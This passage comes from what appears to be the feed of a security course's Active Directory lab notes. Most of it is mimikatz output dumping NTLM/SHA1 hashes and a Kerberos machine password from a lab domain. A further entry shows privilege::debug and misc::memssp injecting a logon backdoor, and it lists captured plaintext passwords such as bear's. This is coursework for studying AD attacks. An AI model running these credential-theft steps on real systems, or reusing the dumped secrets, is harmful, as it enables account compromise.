+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70310&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000112a6&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:24
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70283&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0001128b&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:24
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">996&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e4&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:21
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-20
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">46383&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b52f&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:20
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">46347&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b50b&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:20
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">45411&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b163&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:17
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">999&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e7&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:17
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-18
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/</guid><description>&lt;h1 id="ntustisc---ad-note---lab無法reboot的時盜取passwd">
+ NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)
+ &lt;a class="anchor" href="#ntustisc---ad-note---lab%e7%84%a1%e6%b3%95reboot%e7%9a%84%e6%99%82%e7%9b%9c%e5%8f%96passwd">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來&lt;/p>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="無法reboot的時盜取passwd">
+ ==無法Reboot的時盜取Passwd==
+ &lt;a class="anchor" href="#%e7%84%a1%e6%b3%95reboot%e7%9a%84%e6%99%82%e7%9b%9c%e5%8f%96passwd">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>Inject memssp
+記得用系統管理員權限開mimikatz
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># privilege::debug&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Privilege &lt;span style="color:#e6db74">&amp;#39;20&amp;#39;&lt;/span> OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># misc::memssp&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injected &lt;span style="color:#f92672">=)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>Relogin
+重新登出再登入才會看到&lt;/li>
+&lt;li>Result
+在&lt;code>C:\Windows\System32\mimilsa.log&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f7c0f&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f7c0f&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80d1&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80d1&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80e8&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001f80e8&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\D&lt;/span>ESKTOP-G95U93T$	maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
